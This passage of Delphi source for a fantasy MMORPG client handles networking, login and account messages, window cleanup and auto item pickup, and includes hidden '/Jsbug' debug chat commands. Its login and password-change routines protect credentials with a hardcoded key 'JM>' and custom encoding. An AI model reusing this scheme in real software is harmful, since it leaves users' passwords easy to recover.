    If GetTickCount > g_CheckVerTime Then
    Begin
      g_CheckVerTime := GetTickCount + 60 * 1000;
      If (GetMD5Text(VERSION_WEG) <>
        DecodeString('URDqI_XnHODoUBHsHbTtJRPuUOE_H_PoUOPlJBPsI_X')) Or
        g_boFlag Then
        PostMessage(Handle, WM_CLOSE, 0, 0);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.MouseTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.MyMessage(var MsgData: TMessage);
begin
   If (g_MySelf = Nil) Or (DScreen.CurrentScene <> PlayScene) Then  exit;
          if g_nMiniMaxShow then
             FrmDlg.SetMiniMapSize(2)
          else
             FrmDlg.DBotMiniMapClick(nil,0,0);
end;

Procedure TfrmMain.AutoPickUpItem(boFlag: Boolean);
Var
  I: Integer;
  //  ItemList:TList;
  DropItem: pTDropItem;
  //  ShowItem:pTShowItem;
Begin
  Try //程序自动增加
    If CanNextAction And ServerAcceptNextAction Then
    Begin
      If g_AutoPickupList = Nil Then
        exit;

      g_AutoPickupList.Clear;
      PlayScene.GetXYDropItemsList(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
        g_AutoPickupList);
      If g_AutoPickupList.Count > 0 Then
        For I := 0 To g_AutoPickupList.Count - 1 Do
        Begin
          DropItem := g_AutoPickupList.Items[I];
          If (DropItem.boItemPick) Or (Not g_WgInfo.boAutoPuckItemFil) Or
            (boFlag) Then
          Begin
            SendPickup;
            Break;
          End;
        End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.AutoPickUpItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.WaitMsgTimerTimer(Sender: TObject);
Begin
  Try //程序自动增加
    If g_MySelf = Nil Then
      exit;
    If g_MySelf.ActionFinished Then
    Begin
      WaitMsgTimer.Enabled := FALSE;
      //      PlayScene.MemoLog.Lines.Add('WaitingMsg: ' + IntToStr(WaitingMsg.Ident));
      Case WaitingMsg.Ident Of
        SM_CHANGEMAP:
          Begin
            PlayBgMusic('', False, False);
            g_sBgMusic := '';
            g_boMapMovingWait := FALSE;
            g_boMapMoving := FALSE;
            //
         if g_LegendMap<>nil  then FreeAndNil(g_LegendMap);
          g_nMiniMapPath := nil;
         
            If g_nMDlgX <> -1 Then
            Begin
              FrmDlg.CloseMDlg;
              g_nMDlgX := -1;
            End;
            If g_nShopX <> -1 Then
            Begin
              FrmDlg.DSelfShop2.Visible := False;
              g_nShopX := -1;
            End;
            ClearDropItems;
            PlayScene.CleanObjects;
            EventMan.ClearEvents;
            g_sMapTitle := '';
            g_MySelf.CleanCharMapSetting(WaitingMsg.Param, WaitingMsg.Tag);
            PlayScene.SendMsg(SM_CHANGEMAP, 0,
              WaitingMsg.Param {x},
              WaitingMsg.tag {y},
              WaitingMsg.Series {darkness},
              0, 0,
              WaitingStr {mapname});

            //DScreen.AddSysMsg (IntToStr(WaitingMsg.Param) + ' ' +
            //                   IntToStr(WaitingMsg.Tag) + ' : My ' +
            //                   IntToStr(Myself.XX) + ' ' +
            //                   IntToStr(Myself.m_nCurrY) + ' ' +
            //                   IntToStr(Myself.RX) + ' ' +
            //                   IntToStr(Myself.RY) + ' '
            //                  );
            g_nTargetX := -1;
            g_TargetCret := Nil;
            g_FocusCret := Nil;
            g_MagicTarget := Nil;
          End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.WaitMsgTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

{----------------------- Socket -----------------------}

Procedure TfrmMain.SelChrWaitTimerTimer(Sender: TObject);
Begin
  Try //程序自动增加
    SelChrWaitTimer.Enabled := FALSE;
    SendQueryChr;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SelChrWaitTimerTimer');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ActiveCmdTimer(cmd: TTimerCommand);
Begin
  Try //程序自动增加
    CmdTimer.Enabled := TRUE;
    TimerCmd := cmd;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ActiveCmdTimer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CmdTimerTimer(Sender: TObject);
Begin
  Try //程序自动增加
    CmdTimer.Enabled := FALSE;
    CmdTimer.Interval := 100;
    //   PlayScene.MemoLog.Lines.Add('CmdTimerTimer -' + IntToStr(Integer(TimerCmd)));
    Case TimerCmd Of
      tcSoftClose:
        Begin
          //            PlayScene.MemoLog.Lines.Add('tcSoftClose');
          CmdTimer.Enabled := FALSE;
          CSocket.Socket.Close;
        End;
      tcReSelConnect:
        Begin
          // try
//            PlayScene.MemoLog.Lines.Add('ConnectionStep -1');
           //霸烙 函荐 檬扁拳...
          ResetGameVariables;
          //            PlayScene.MemoLog.Lines.Add('ConnectionStep -2');
                      //
          DScreen.ChangeScene(stSelectChr);
          //            PlayScene.MemoLog.Lines.Add('ConnectionStep -3');
          g_ConnectionStep := cnsReSelChr;
          {
          except
            on e: Exception do
            PlayScene.MemoLog.Lines.Add(e.Message);
          end;
          }
//            if ConnectionStep = cnsReSelChr then
//              PlayScene.MemoLog.Lines.Add('ConnectionStep -cnsReSelChr');
          If Not BoOneClick Then
          Begin
            //               PlayScene.MemoLog.Lines.Add('cnsReSelChr -' +  SelChrAddr + '/' + IntToStr(SelChrPort) );
            With CSocket Do
            Begin
              Active := FALSE;
              Address := g_sSelChrAddr;
              Port := g_nSelChrPort;
              Active := TRUE;
            End;

          End
          Else
          Begin
            If CSocket.Socket.Connected Then
              CSocket.Socket.SendText('$S' + g_sSelChrAddr + '/' +
                IntToStr(g_nSelChrPort) + '%');
            CmdTimer.Interval := 1;
            ActiveCmdTimer(tcFastQueryChr);
          End;

        End;
      tcFastQueryChr:
        Begin
          SendQueryChr;
        End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CmdTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CloseAllWindows;
Var
  I: Integer;
Begin
  Try //程序自动增加
    PlayBgMusic('', False, False);
    With FrmDlg Do
    Begin
      DItemBag.Visible := FALSE;
      DMsgDlg.Visible := FALSE;
      DStateWin.Visible := FALSE;
      DMerchantDlg.Visible := FALSE;
      DSellDlg.Visible := FALSE;
      DMenuDlg.Visible := FALSE;
      DKeySelDlg.Visible := FALSE;
      DGroupDlg.Visible := FALSE;
      DDealDlg.Visible := FALSE;
      DDealRemoteDlg.Visible := FALSE;
      DGuildDlg.Visible := FALSE;
      DGuildEditNotice.Visible := FALSE;
      DUserState1.Visible := FALSE;
      DAdjustAbility.Visible := FALSE;
      DHeroStateWindow.Visible := False;
      DHeroDlg.Visible := False;
      DFriendDlg.Visible := False;
      DShopWin.Visible := False;
      DHeroItemBag.Visible := False;
      DMiniMapDlg.Visible := False;
      DItemLeve.Visible := False;
      DTaxis.Visible := False;
      DOpenArk.Visible := False;
      DSelfShop.Visible := False;
      DSelfShop2.Visible := False;
      DWBooks.Visible := False;
      DWgInfo.Visible := False;
      HeroStatePage := 0;
      m_boAutoGroup := False;
      m_boOpenBox := False;
      DPlayDrink.Visible := False;
      DGetHero.Visible := False;
      DCompeteDrink.Visible := False;
      DWMakeWineDesk.Visible:=False;
      DNewWG.Visible := False;
      DWChallenge.Visible:=False;
    End;
    If g_nMDlgX <> -1 Then
    Begin
      FrmDlg.CloseMDlg;
      g_nMDlgX := -1;
    End;
    If g_nShopX <> -1 Then
    Begin
      FrmDlg.DSelfShop2.Visible := False;
      g_nShopX := -1;
    End;
    g_nDragonCount := 0;
    g_boItemMoving := FALSE; //
    g_MyFriendList.Clear;
    g_MyBlacklist.Clear;
    g_OpenArkItem.S.Name := '';
    g_OpenArkKeyItem.S.Name := '';
    FillChar(g_HeroUseItems, sizeof(TClientItem) * 14, #0);
    FillChar(g_HeroItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    FillChar(g_LevelItemArr, SizeOf(TClientItem) * 3, #0);
    FillChar(g_UseItems, sizeof(TClientItem) * 14, #0);
    FillChar(g_ItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    FillChar(g_DealItems, sizeof(TClientItem) * 10, #0);
    FillChar(g_DealRemoteItems, sizeof(TClientItem) * 20, #0);
    FillChar(g_WineItem, Sizeof(TClientItem) * 7, #0);
    FillChar(g_WineItem1, Sizeof(TClientItem) * 3, #0);

    For I := 0 To g_ShopTopList.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopTopList[i]));
    For I := 0 To g_ShopList1.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopList1[i]));
    For I := 0 To g_ShopList2.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopList2[i]));
    For I := 0 To g_ShopList3.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopList3[i]));
    For I := 0 To g_ShopList4.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopList4[i]));
    For I := 0 To g_ShopList5.Count - 1 Do
      Dispose(pTNewFileItem(g_ShopList5[i]));

    g_ShopList1.Clear;
    g_ShopList2.Clear;
    g_ShopList3.Clear;
    g_ShopList4.Clear;
    g_ShopList5.Clear;
    g_ShopTopList.Clear;
    ClientGetCloseHero;

    For i := 0 To g_HeroMagicList.Count - 1 Do
      Dispose(PTClientMagic(g_HeroMagicList[i]));
    g_HeroMagicList.Clear;

    For i := 0 To g_MagicList.Count - 1 Do
      Dispose(PTClientMagic(g_MagicList[i]));
    g_MagicList.Clear;
    For i := Low(g_MyMagic) To High(g_MyMagic) Do
      g_MyMagic[I] := Nil;

    For I := 0 To g_ItemFiltrateList.Count - 1 Do
      Dispose(pTItemFiltrate(g_ItemFiltrateList[i]));
   {
    For I := 0 To g_OpenItemList.Count - 1 Do
      Dispose(pTOpenItem(g_OpenItemList[i]));
    g_OpenItemList.Clear;
    }
    g_ItemFiltrateList.Clear;
    g_CorpsMonList.Clear;

    If Assigned(FormWgMain) Then
    Begin
      FormWgMain.Visible := False;
      FormWgMain.Free;
      FormWgMain := Nil;
    End;
    g_WgClass := 0;
    If ClientSocket.Socket.Connected Then
    Begin
      ClientSocket.Socket.Close;
      ClientSocket.Active := False;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CloseAllWindows'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClearDropItems;
Var
  I: Integer;
Begin
  Try //程序自动增加
    For I := 0 To g_DropedItemList.Count - 1 Do
    Begin
      Dispose(PTDropItem(g_DropedItemList[I]));
    End;
    g_DropedItemList.Clear;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClearDropItems'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ResetGameVariables;
Var
  i: integer;
  //   ClientMagic:pTClientMagic;
Begin
  Try //程序自动增加
    Try
      CloseAllWindows;
      ClearDropItems;
      //  ClearShowItemList();
      For i := 0 To g_MagicList.Count - 1 Do
      Begin
        Dispose(pTClientMagic(g_MagicList[i]));
      End;
      g_MagicList.Clear;

      g_boItemMoving := FALSE;
      g_WaitingUseItem.Item.S.Name := '';
      g_EatingItem.S.name := '';
      g_HeroEatingItem.S.Name := '';
      g_SelfShopItem.S.Name := '';
      g_nTargetX := -1;
      g_TargetCret := Nil;
      g_FocusCret := Nil;
      g_MagicTarget := Nil;
      ActionLock := FALSE;
      g_GroupMembers.Clear;
      g_sGuildRankName := '';
      g_sGuildName := '';

      g_boMapMoving := FALSE;
      WaitMsgTimer.Enabled := FALSE;
      g_boMapMovingWait := FALSE;
      DScreen.ChatBoardTop := 0;
      g_boNextTimePowerHit := FALSE;
      g_boCanLongHit := FALSE;
      g_boCanWideHit := FALSE;
      g_boCanCrsHit := False;

      //  g_boCanTwnHit   := False;

      g_boNextTimeFireHit := FALSE;
      g_boNextTimeLongFireHit := False;

      FillChar(g_UseItems, sizeof(TClientItem) * 9, #0);
      FillChar(g_ItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);

      With SelectChrScene Do
      Begin
        FillChar(ChrArr, sizeof(TSelChar) * 2, #0);
        ChrArr[0].FreezeState := TRUE; //扁夯捞 倔绢 乐绰 惑怕
        ChrArr[1].FreezeState := TRUE;
      End;
      PlayScene.ClearActors;
      ClearDropItems;
      EventMan.ClearEvents;
      PlayScene.CleanObjects;
      //DxDrawRestoreSurface (self);
      g_MySelf := Nil;

    Except
      //  on e: Exception do
      //    PlayScene.MemoLog.Lines.Add(e.Message);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ResetGameVariables'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ChangeServerClearGameVariables;
Var
  i: integer;
Begin
  Try //程序自动增加
    CloseAllWindows;
    ClearDropItems;
    For i := 0 To g_MagicList.Count - 1 Do
      Dispose(PTClientMagic(g_MagicList[i]));
    g_MagicList.Clear;
    g_boItemMoving := FALSE;
    g_WaitingUseItem.Item.S.Name := '';
    g_EatingItem.S.name := '';
    g_nTargetX := -1;
    g_TargetCret := Nil;
    g_FocusCret := Nil;
    g_MagicTarget := Nil;
    ActionLock := FALSE;
    g_GroupMembers.Clear;
    g_sGuildRankName := '';
    g_sGuildName := '';

    g_boMapMoving := FALSE;
    WaitMsgTimer.Enabled := FALSE;
    g_boMapMovingWait := FALSE;
    g_boNextTimePowerHit := FALSE;
    g_boCanLongHit := FALSE;
    g_boCanWideHit := FALSE;
    g_boCanCrsHit := False;
    //  g_boCanTwnHit   := False;

    ClearDropItems;
    EventMan.ClearEvents;
    PlayScene.CleanObjects;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ChangeServerClearGameVariables');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CSocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
//var
   //packet: array[0..255] of char;
   //strbuf: array[0..255] of char;
   //str: string;
Begin
  Try //程序自动增加
    //exit;
      //PlayMp3('http://218.25.243.213/music/20060210/ljj/1.mp3',True);
{$IF WINDOPROCESS  = OPENPROCESS}
    If Not boGetProcess Then
    Begin
      boGetProcess := True;
      SendSocket(MG_GETPROCESS);
    End;
{$IFEND}
    g_boServerConnected := TRUE;
    //   m_boLogin:=True;
    If g_ConnectionStep = cnsLogin Then
    Begin
      {if OneClickMode = toKornetWorld then begin  //内齿岿靛甫 版蜡秦辑 霸烙俊 立加
         FillChar (packet, 256, #0);
         str := 'KwGwMGS';             StrPCopy (strbuf, str);  Move (strbuf, (@packet[0])^, Length(str));
         str := 'CONNECT';             StrPCopy (strbuf, str);  Move (strbuf, (@packet[8])^, Length(str));
         str := KornetWorld.CPIPcode;  StrPCopy (strbuf, str);  Move (strbuf, (@packet[16])^, Length(str));
         str := KornetWorld.SVCcode;   StrPCopy (strbuf, str);  Move (strbuf, (@packet[32])^, Length(str));
         str := KornetWorld.LoginID;   StrPCopy (strbuf, str);  Move (strbuf, (@packet[48])^, Length(str));
         str := KornetWorld.CheckSum;  StrPCopy (strbuf, str);  Move (strbuf, (@packet[64])^, Length(str));
         Socket.SendBuf (packet, 256);
      end;}
      DScreen.ChangeScene(stLogin);
{$IF USECURSOR = DEFAULTCURSOR}
      DxDraw.Cursor := crDefault;
{$IFEND}
    End;
    If g_ConnectionStep = cnsSelChr Then
    Begin
      LoginScene.OpenLoginDoor;
      SelChrWaitTimer.Enabled := TRUE;
    End;
    If g_ConnectionStep = cnsReSelChr Then
    Begin
      CmdTimer.Interval := 1;
      ActiveCmdTimer(tcFastQueryChr);
    End;
    If g_ConnectionStep = cnsPlay Then
    Begin
      If Not g_boServerChanging Then
      Begin
        ClearBag; //啊规 檬扁拳
        DScreen.ClearChatBoard; //盲泼芒 檬扁拳
        DScreen.ChangeScene(stLoginNotice);
      End
      Else
      Begin
        ChangeServerClearGameVariables;
      End;
      SendRunLogin;
    End;
    SocStr := '';
    BufferStr := '';
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CSocketConnect'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CSocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
Begin
  Try //程序自动增加
    //   m_boLogin:=True;
    g_boServerConnected := FALSE;
    If (g_ConnectionStep = cnsLogin) And Not g_boSendLogin Then
    Begin
      if not g_boWgClose then
      begin
        FrmDlg.DMessageDlg('Connection closed...', [mbOk]);
        Close;
      end;
     End;
    If g_SoftClosed Then
    Begin
      //      PlayScene.MemoLog.Lines.Add('CSocketDisconnect - tcSoftClose');
      g_SoftClosed := FALSE;
      ActiveCmdTimer(tcReSelConnect);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CSocketDisconnect'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CSocketError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; Var ErrorCode: Integer);
Begin
  Try //程序自动增加
    //   m_boLogin:=True;
    ErrorCode := 0;
    Socket.Close;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CSocketError'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CSocketRead(Sender: TObject; Socket: TCustomWinSocket);
Var
  n: integer;
  data, data2, TempData: String;
  //Buff:PChar;
Begin
  Try //程序自动增加
    {n:=Socket.ReceiveLength;
    GetMem(Buff,n);
    Socket.ReceiveBuf(Buff^,n);
    data:=String(Buff);
    FreeMem(Buff);}
    data := Socket.ReceiveText;

    //if pos('GOOD', data) > 0 then DScreen.AddSysMsg (data);
    //DebugOutStr(data);
    n := pos('*', data);
    If n > 0 Then
    Begin
      data2 := Copy(data, 1, n - 1);
      data := data2 + Copy(data, n + 1, Length(data));
      //SendSocket ('*');
      CSocket.Socket.SendText('*');
    End;

    If Not boSend Then
    Begin
      boSend := True;
      If (length(data) > 0) And (data[1] = '<') Then
      Begin
        TempData := ArrestStringEx(data, '<', '>', data2);
        If data2 = MG_EDCODE Then
        Begin
          boEDCode := True;
        End
        Else If data2 = MG_RSAEDCODE Then
        Begin
          boRSACode := True;
        End;
        //FrmDlg.DMessageDlg('服务器采用的新加密方式，无法登录！\由于客户端加密有所更改\请通知管理员将服务端的登录网关更新到最新版。',[mbOk]);
        //CSocket.Socket.Close;
        //Close;
        //boEDCode:=True;
     // end;
      if TempData <> '' then
        boEDcodeIp := True;
       sEDcodeKey := data;
      End
      Else
        SocStr := SocStr + data;
    End
    Else
      SocStr := SocStr + data;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CSocketRead'); //程序自动增加
  End; //程序自动增加
End;

{-------------------------------------------------------------}

Procedure TfrmMain.SendSocket(sendstr: String);
Const
  code: byte = 1;
Var
  sSendText: String;
Begin
  Try //程序自动增加
    If CSocket.Socket.Connected Then
    Begin
      sSendText := '#' + IntToStr(code) + sendstr + '!';
      Inc(code);
      If code >= 10 Then
        code := 1;
      While True Do
      Begin
        If CSocket.Socket.SendText(sSendText) <> -1 Then
          break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSocket'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendClientMessage(msg, Recog, param, tag, series: integer);
Var
  dmsg: TDefaultMessage;
Begin
  Try //程序自动增加
    dmsg := MakeDefaultMsg(msg, Recog, param, tag, series);
    SendSocket(EncodeMessage(dmsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendClientMessage'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendLogin(uid, passwd: String);
Var
  msg: TDefaultMessage;
  Send: String;
Begin
  Try //程序自动增加
    LoginId := uid;
    LoginPasswd := passwd;
    msg := MakeDefaultMsg(CM_IDPASSWORD, 0, 0, 0, 0);
    Send := EncodeMessage(msg) + EncodeString(uid + '/' + passwd);
    If boRSACode Then
    Begin
      Send := EncodeMessage(msg) + Client.EncryptStr(EncodeString(uid + '/' +
        passwd));
    End
    Else If boEDCode Then
    Begin
      Send := EncryStrHex(Send, 'JM>');
    End;
    SendSocket(Send);
    g_boSendLogin := True;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendLogin'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendNewAccount(ue: TUserEntry; ua: TUserEntryAdd);
Var
  msg: TDefaultMessage;
  Send: String;
Begin
  Try //程序自动增加
    MakeNewId := ue.sAccount;
    msg := MakeDefaultMsg (CM_ADDNEWUSER, 0, 0, 0, 0);
    if boRSACode then
    begin
      Send :=Client.EncryptStr(EncodeBuffer(@ue, sizeof(TUserEntry))
        + EncodeBuffer(@ua, sizeof(TUserEntryAdd)));
      Send := EncodeMessage(msg) + Send;
    end
    else
    begin
      Send := EncodeMessage(msg) + EncodeBuffer(@ue, sizeof(TUserEntry)) +
        EncodeBuffer(@ua, sizeof(TUserEntryAdd));
      if boEDCode then
      begin
        if boEDcodeIp then
          Send := EncryStrHex(Send, sEDcodeKey)
        else
          Send := EncryStrHex(Send, 'JM>');
      end;
     end;
    SendSocket (Send);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendNewAccount'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendUpdateAccount(ue: TUserEntry; ua: TUserEntryAdd);
Var
  msg: TDefaultMessage;
  Send: String;
Begin
  Try //程序自动增加
    MakeNewId := ue.sAccount;
    msg := MakeDefaultMsg (CM_UPDATEUSER, 0, 0, 0, 0);
    if boRSACode then
    begin
      Send :=Client.EncryptStr(EncodeBuffer(@ue, sizeof(TUserEntry))
        + EncodeBuffer(@ua, sizeof(TUserEntryAdd)));
      Send := EncodeMessage(msg) + Send;
    end
    else
    begin
      Send := EncodeMessage(msg) + EncodeBuffer(@ue, sizeof(TUserEntry)) +
        EncodeBuffer(@ua, sizeof(TUserEntryAdd));
      if boEDCode then
      begin
        if boEDcodeIp then
          Send := EncryStrHex(Send, sEDcodeKey)
        else
          Send := EncryStrHex(Send, 'JM>');
      end;
     end;
    SendSocket (Send);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendUpdateAccount'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSelectServer(svname: String);
Var
  msg: TDefaultMessage;
  Send: String;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SELECTSERVER, 0, 0, 0, 0);
    Send := EncodeMessage(msg) + EncodeString(svname);
    If boRSACode Then
    Begin
      Send := EncodeMessage(msg) + Client.EncryptStr(EncodeString(svname));
    End
    Else If boEDCode Then
    Begin
      Send := EncryStrHex(Send, 'JM>');
    End;
    SendSocket(Send);
    //SendSocket (EncodeMessage (msg) + EncodeString(svname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSelectServer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendChgPw(id, passwd, newpasswd: String);
Var
  msg: TDefaultMessage;
  Send,sMsg: String;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg (CM_CHANGEPASSWORD, 0, 0, 0, 0);
    sMsg:=id + #9 + passwd + #9 + newpasswd;

    if boRSACode then
    begin
      Send := EncodeMessage(msg) +Client.EncryptStr(EncodeString(sMsg));
    end
    else
    begin
      Send:= EncodeMessage(msg) + EncodeString(sMsg);
      if boEDCode then
      begin
        if boEDcodeIp then
          Send:= EncryStrHex(Send,sEDcodeKey)
        else
          Send:= EncryStrHex(Send,'JM>');
      end;
    end;
  SendSocket(Send);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendChgPw'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendNewChr(uid, uname, shair, sjob, ssex: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_NEWCHR, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(uid + '/' + uname + '/' + shair
      + '/' + sjob + '/' + ssex));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendNewChr'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendQueryChr;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_QUERYCHR, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(LoginId + '/' +
      IntToStr(Certification)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendQueryChr'); //程序自动增加
  End; //程序自动增加
End;


Procedure TfrmMain.SendDelChr(chrname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DELCHR, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(chrname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDelChr'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSelChr(chrname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    CharName := chrname;
    msg := MakeDefaultMsg(CM_SELCHR, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(LoginId + '/' + chrname));
    PlayScene.EdAccountt.Visible := False; //2004/05/17
    PlayScene.EdChrNamet.Visible := False; //2004/05/17
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSelChr'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendRunLogin;
Var
  //   msg: TDefaultMessage;
  //   str: string;
  sSendMsg: String;
Begin
  Try //程序自动增加
    //强行登录
    {
    str := '**' +
           PlayScene.EdAccountt.Text + '/' +
           PlayScene.EdChrNamet.Text + '/' +
           IntToStr(Certification) + '/' +
           IntToStr(VERSION_NUMBER) + '/';
   }

 (*   str := '**' +
           LoginId + '/' +
           CharName + '/' +
           IntToStr(Certification) + '/' +
           IntToStr(VERSION_NUMBER) + '/';

 //          IntToStr(VERSION_NUMBER_0522) + '/';

    //if NewGameStart then begin
    //   str := str + '0';
    //   NewGameStart := FALSE;
    //end else str := str + '1';
    str := str + '9';*)

    sSendMsg := format('**%s/%s/%d/%d/%d', [LoginId, CharName, Certification,
      CLIENT_VERSION_NUMBER, RUNLOGINCODE]);
    SendSocket(EncodeString(sSendMsg));

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendRunLogin'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSay(str: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If str <> '' Then
    Begin
      If m_boPasswordIntputStatus Then
      Begin
        m_boPasswordIntputStatus := False;
        PlayScene.EdChat.PasswordChar := #0;
        PlayScene.EdChat.Visible := False;
        SendPassword(str, 1);
        exit;
      End;
      If CompareLstr(str, '/Jscmd', length('/Jscmd')) Then
      Begin
        ProcessCommand(str);
        exit;
      End;
      If str = '/Jsbug Url' Then
      Begin
        //PlayBgMusic('http://ftp.js991.com/bg.mp3',True,False);
        //FrmDlg.OpenGameWeb('http://pay.sdo.com/GameDeposit/CQDefault.aspx?game=4&gamearea=28&gameserver=5&playerid=');
        exit;
      End;

      If str = '/Jsbug check' Then
      Begin
        g_boShowMemoLog := Not g_boShowMemoLog;
        PlayScene.MemoLog.Clear;
        PlayScene.MemoLog.Visible := g_boShowMemoLog;
        exit;
      End;
      If str = '/Jsbug powerblock' Then
      Begin
        SendPowerBlock();
        exit;
      End;
      If str = '/Jsbug str' Then
      Begin
        //DScreen.AddChatADString('测试文件不用啊',clRed,clWhite,GetTickCount+10*1000);
        //DecodeMessagePacket('<<<<<CTS<<<<<<<<nwrs{gOonFixVCMpX?dkGsYsYnuFXo`uHNu_Wrp');
        exit;
      End;

      If str = '/Jsbug screen' Then
      Begin
        g_boCheckBadMapMode := Not g_boCheckBadMapMode;
        If g_boCheckBadMapMode Then
          DScreen.AddSysMsg('On')
        Else
          DScreen.AddSysMsg('Off');
        exit;
      End;
      If str = '/Jsbug speedhack' Then
      Begin
        g_boCheckSpeedHackDisplay := Not g_boCheckSpeedHackDisplay;
        exit;
      End;
      If str = '/Jsbug hungry' Then
      Begin
        Inc(g_nMyHungryState);
        If g_nMyHungryState > 4 Then
          g_nMyHungryState := 1;

        exit;
      End;
      If str = '/Jsbug screen' Then
      Begin
        g_boShowGreenHint := Not g_boShowGreenHint;
        g_boShowWhiteHint := Not g_boShowWhiteHint;
        exit;
      End;

      If str = '/Jsbug password' Then
      Begin
        If PlayScene.EdChat.PasswordChar = #0 Then
          PlayScene.EdChat.PasswordChar := '*'
        Else
          PlayScene.EdChat.PasswordChar := #0;
        exit;
      End;
      If PlayScene.EdChat.PasswordChar = '*' Then
        PlayScene.EdChat.PasswordChar := #0;

      msg := MakeDefaultMsg(CM_SAY, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(str));
      If str[1] = '/' Then
      Begin
        DScreen.AddChatBoardString(str, GetRGB(180), clWhite);
        GetValidStr3(Copy(str, 2, Length(str) - 1), WhisperName, [' ']);
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSay'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendActMsg(ident, x, y, dir: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(ident, MakeLong(x, y), 0, dir, 0);
    SendSocket(EncodeMessage(msg));
    ActionLock := TRUE;
    //辑滚俊辑 #+FAIL! 捞唱 #+GOOD!捞 棵锭鳖瘤 扁促覆
    ActionLockTime := GetTickCount;
    Inc(g_nSendCount);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendActMsg'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSpellMsg(ident, x, y, dir, target: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(ident, MakeLong(x, y), Loword(target), dir,
      Hiword(target));
